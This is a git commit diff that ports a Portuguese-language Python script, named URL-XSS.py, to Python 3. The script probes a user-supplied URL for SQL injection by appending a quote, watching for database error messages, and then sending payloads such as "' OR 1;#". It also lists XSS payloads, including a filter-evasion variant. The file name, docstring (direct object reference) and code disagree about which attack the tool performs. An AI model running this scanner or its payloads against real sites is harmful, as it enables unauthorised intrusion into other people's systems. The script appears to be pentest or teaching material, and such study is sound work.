acb83a5123f72c9d8d29036c37fdec521564cee2
AlemãoProgramDev <113868433+alemaoprogramdev@users.noreply.github.com>
2023-09-25 20:36:40 -0300

    Update URL-XSS.py

--- URL-XSS.py
+++ URL-XSS.py
@@ -2,9 +2,9 @@
 # -*- coding: UTF-8 -*-
 
 """
-  Esse arquivo faz 
-  tentaiva de ataque ao
-  Referência de objeto direto
+  Este arquivo faz uma
+  tentativa de ataque a
+  Referência de Objeto Direto
 
   Modificado em 28 de fevereiro de 2017
   por Vitor Mazuco (vitor.mazuco@gmail.com)
@@ -12,30 +12,29 @@
 
 # Importando as bibliotecas necessárias.
 import requests
-import sys
 
-# Argumento necessário
-url = sys.argv[1]
+# Solicitar a URL ao usuário
+url = input("Digite a URL alvo: ")
 initial = "'"
 
 # Tipos de payload para testes
 secondary = ["' OR 1;#", " OR 1;#"]
 payloads = ['<script>alert(1);</script>', '<scrscriptipt>alert(1);</scrscriptipt>', '<BODY ONLOAD=alert(1)>']
 
-
-first = requests.post(url+initial)
-if "mysql" in first.text.lower() or "native client" in first.text.lower() or "syntax error" in first.text.lower():
-	print "Injetável"
-	for payload in secondary: # Pode trocar por payloads ou secondary
-		req = requests.post(url+payload)
-		if payload in req.text:
-			print "Parâmetro vulnerável\r\n"
-			print "Atacando com a string: "+payload
-			print req.text
-			break
-		else:
-			print "Não é vulnerável"
-else: 
-	print "Não Injetável"
-
-
+try:
+    first = requests.post(url+initial)
+    if "mysql" in first.text.lower() or "native client" in first.text.lower() or "syntax error" in first.text.lower():
+        print("Injetável")
+        for payload in secondary:
+            req = requests.post(url+payload)
+            if payload in req.text:
+                print("Parâmetro vulnerável\r\n")
+                print("Atacando com a string: "+payload)
+                print(req.text)
+                break
+            else:
+                print("Não é vulnerável")
+    else:
+        print("Não Injetável")
+except Exception as e:
+    print(f"Ocorreu um erro: {e}")
